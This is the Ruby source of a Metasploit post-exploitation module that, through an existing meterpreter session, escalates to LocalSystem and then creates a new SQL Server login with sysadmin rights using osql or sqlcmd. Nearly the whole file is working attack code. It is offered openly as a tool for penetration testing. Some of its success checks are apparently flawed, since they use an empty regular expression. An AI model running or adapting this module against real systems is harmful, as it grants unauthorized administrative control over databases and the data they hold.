require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'

class Metasploit3 < Msf::Post

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'SQL Server - Local Authorization Bypass',
				'Description'   => %q{ When this module is executed via an existing 
				meterpreter session it can be used to gain unauthorized access to local 
				SQL Server instances.  It first obtains LocalSystem privileges 
				using the "getsystem" escalation methods. Then, it adds a sysadmin 
				login to the local SQL Server using native SQL clients and stored
				procedures.  If no intance is specified the default will be used.  
				
				This is possible because LocalSystem has syadmin privileges in SQL Server 
				by default in order to manage SQL Server patches.  This has been tested
				in SQL Server 2000. 2005, 2008, and 2012.},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Scott Sutherland <scott.sutherland@netspi.com>'],
				'Platform'      => [ 'Windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))

		register_options(
			[
				OptString.new('DB_USERNAME',  [true, 'New sysadmin login', '']),
				OptString.new('DB_PASSWORD',  [true, 'Password for new sysadmin login', '']),
				OptString.new('_INSTANCE',  [false, 'Name of target SQL Server instance', '']),
				OptBool.new('_REMOVE_LOGIN',  [false, 'Remove DB_USERNAME login from database', 'false']),
				OptBool.new('_VERBOSE',  [false, 'Set how verbose the output should be', 'false']),
			], self.class)
	end
	
	# TODO
	# - Test all options on all SQL Server 2k to 2k12 - local system only has public
    # - rewrite to migrate to sql service instead of dropping to system.	

	def run
				
		# Set verbosity level
		verbose = datastore['_verbose'].to_s.downcase 
		
		# Set instance name (if specified)
		instance = datastore['_instance'].to_s.upcase
		
		# Display target
		print_status("Running module against #{sysinfo['Computer']}")	
	
		# Get LocalSystem privileges		
		print_status("Attempting to obtain LocalSystem privileges...") if verbose == "true"
		system_status = session.priv.getsystem
		if system_status[0]			
			print_good("Obtained LocalSystem privileges")
			
			# Check if a SQL Server service is running
			print_status("Checking for SQL Server...") if verbose == "true"
			service_instance = check_for_sqlserver(instance)			
			if service_instance != 0
								
				# Identify available native SQL client
				print_status("Checking for native client...") if verbose == "true"
				sql_client = get_sql_client()				
				if sql_client != 0
				
					# Check if remove_login was selected
					if datastore['_REMOVE_LOGIN'].to_s.downcase == "false"
											
						# Add new login
						print_status("Attempting to add new login #{datastore['DB_USERNAME']}...") if verbose == "true"
						add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)
						if add_login_status == 1
							
							# Add login to sysadmin fixed server role
							print_status("Attempting to make #{datastore['DB_USERNAME']} login a sysadmin...") if verbose == "true"
							add_sysadmin(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)				
						end
					else
						
						# Remove login
						remove_sql_login(sql_client,datastore['DB_USERNAME'],instance,service_instance,verbose)
					end
					
				end
			end
		else
			print_error("Could not obtain LocalSystem privileges")
		end
		
	end
	
	
	## Method to check if the SQL Server service is running
	def check_for_sqlserver(instance)
	
		# Get Data
		running_services = run_cmd("net start")	
		
		# Parse Data
		services_array = running_services.split("\n")		
		
		# Check for the SQL Server service
		services_array.each do |service|		
			if instance == "" then			
				# Target default instance
				if service =~ /SQL Server \(| MSSQLSERVER/ then 					
					# Display results
					service_instance = service.gsub(/SQL Server \(/, "").gsub(/\)/, "").lstrip.rstrip
					print_good("SQL Server service found: #{service_instance}")				
					return service_instance
				end
			else
			
				# Target user defined instance
				if service =~ /#{instance}/ then 
				
					# Display user defined instance				
					print_good("SQL Server instance found: #{instance}")				
					return instance
				end
			end
		end		
		
		# Fail
		if instance == "" then	
			print_error("SQL Server instance NOT found")		
		else
			print_error("SQL Server instance \"#{instance}\" was NOT found")		
		end
		return 0
	end

	
	## Method for identifying which SQL client to use
	def get_sql_client
	
		# Get Data - osql
		running_services1 = run_cmd("osql -?")	
		
		# Parse Data - osql
		services_array1 = running_services1.split("\n")
		
		# Check for osql
		services_array1.each do |service1|
			if service1 =~ /SQL Server Command Line Tool/ then 
				print_good("OSQL client is available")
				return "osql"
			end
		end				
		
		# Get Data - sqlcmd
		running_services = run_cmd("sqlcmd -?")			
		
		# Parse Data - sqlcmd
		services_array = running_services.split("\n")
		
		# Check for SQLCMD
		services_array.each do |service|
			if service =~ /SQL Server Command Line Tool/ then 
				print_good("SQLCMD client is available")
				return "sqlcmd"
			end
		end		
		
		# Fail
		print_error("No native SQL client available")
		return 0
	end

	## Method for adding a login
	def add_sql_login(sqlclient,dbuser,dbpass,instance,service_instance,verbose)
					
		# Setup command format to accomidate command inconsistencies
		if instance == ""			
			# Check default instance name
			if service_instance == "SQLEXPRESS" then			
				# Set command here			
				sqlcommand = "#{sqlclient} -E -S .\\SQLEXPRESS -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""			
			else 							
				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""						
			end
		else		
			# Set command here
			sqlcommand = "#{sqlclient} -E -S .\\#{instance} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""				
		end

		# Display debugging information
		print_status("Settings:") if verbose == "true" 
		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
		print_status(" o Service instance: #{service_instance}") if verbose == "true" 
		print_status(" o User defined instance: #{instance}") if verbose == "true" 
		print_status(" o User: #{dbuser}") if verbose == "true" 
		print_status(" o Password:  #{dbpass}") if verbose == "true"  		
		print_status("Command:") if verbose == "true" 
		print_status("#{sqlcommand}") if verbose == "true" 
		
		# Get Data
		add_login_result = run_cmd("#{sqlcommand}")
		
		# Parse Data 
		add_login_array = add_login_result.split("\n")
		
		# Check for success
		check = 0
		add_login_array.each do |service|
			if service =~ // then
					check = 1
			end
		end	
		
		# Display reults
		if check == 0			
			print_good("Successfully added login \"#{dbuser}\" with password \"#{dbpass}\"")	
			return 1			
		else 		
			# Fail
			print_error("Unabled to add login #{dbuser}")
			print_error("Database Error:\n #{add_login_result}")
			return 0			
		end

	end
	
	
	## Method for adding a login to sysadmin role
	def add_sysadmin(sqlclient,dbuser,dbpass,instance,service_instance,verbose)
	
		# Setup command format to accomidate command inconsistencies
		if instance == ""			
			# Check default instance name
			if service_instance == "SQLEXPRESS" then			
				# Set command here for SQLEXPRESS							
				sqlcommand = "#{sqlclient} -E -S .\\SQLEXPRESS -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""				
			else 											
				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""				
			end
		else		
			# Set command here			
			sqlcommand = "#{sqlclient} -E -S .\\#{instance} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""	
		end
	
		# Display debugging information
		print_status("Settings:") if verbose == "true" 
		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
		print_status(" o Service instance: #{service_instance}") if verbose == "true" 
		print_status(" o User defined instance: #{instance}") if verbose == "true" 
		print_status(" o User: #{dbuser}") if verbose == "true" 
		print_status(" o Password:  #{dbpass}") if verbose == "true"  		
		print_status("Command:") if verbose == "true" 
		print_status("#{sqlcommand}") if verbose == "true" 
		
		# Get Data
		add_sysadmin_result = run_cmd("#{sqlcommand}")
		
		# Parse Data 
		add_sysadmin_array = add_sysadmin_result.split("\n")
		
		# Check for success
		check = 0
		add_sysadmin_array.each do |service|
			if service =~ /bingo/ then
					check = 1
			end
		end	
		
		# Display results to user
		if check == 1				
			print_good("Successfully added \"#{dbuser}\" to sysadmin role")
			return 1			
		else 		
			# Fail
			print_error("Unabled to add #{dbuser} to sysadmin role")
			print_error("Database Error:\n #{add_login_result}")
			return 0		
		end
	end

	
	## Method for removing login
	def remove_sql_login(sqlclient,dbuser,instance,service_instance,verbose)
	
		# Setup command format to accomidate command inconsistencies
		if instance == ""			
			# Check default instance name
			if service_instance == "SQLEXPRESS" then			
				# Set command here for SQLEXPRESS											
				sqlcommand = "#{sqlclient} -E -S .\\SQLEXPRESS  -Q \"sp_droplogin '#{dbuser}'\""				
			else 															
				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_droplogin '#{dbuser}'\""				
			end
		else		
			# Set command here						
			sqlcommand = "#{sqlclient} -E -S .\\#{instance} -Q \"sp_droplogin '#{dbuser}'\""
		end
		
		# Display debugging information
		print_status("Settings:") if verbose == "true" 
		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
		print_status(" o User: #{dbuser}") if verbose == "true" 	
		print_status(" o Service instance: #{service_instance}") if verbose == "true" 
		print_status(" o User defined instance: #{instance}") if verbose == "true" 		
		print_status("Command:") if verbose == "true" 
		print_status("#{sqlcommand}") if verbose == "true" 
		
		# Get Data
		remove_login_result = run_cmd("#{sqlcommand}")
		
		# Parse Data 
		remove_login_array = remove_login_result.split("\n")
		
		# Check for success
		check = 0
		remove_login_array.each do |service|
			if service =~ // then
					check = 1
			end
		end	
		
		# Display result
		if check == 0			
			print_good("Successfully removed login \"#{dbuser}\"")	
			return 1			
		else 		
			# Fail
			print_error("Unabled to remove login #{dbuser}")
			print_error("Database Error:\n #{remove_login_result}")
			return 0			
		end
	end
		
	# Method for executing cmd and returning the response
	# Note: This is from one of Jabra's modules - Thanks man!
	# Warning: This doesn't want to work for me on Win2k systems.
	def run_cmd(cmd,token=true)
		opts = {'Hidden' => true, 'Channelized' => true, 'UseThreadToken' => token}
		process = session.sys.process.execute(cmd, nil, opts)
		res = ""
		while (d = process.channel.read)
			break if d == ""
			res << d
		end
		process.channel.close
		process.close
		return res
	end
end

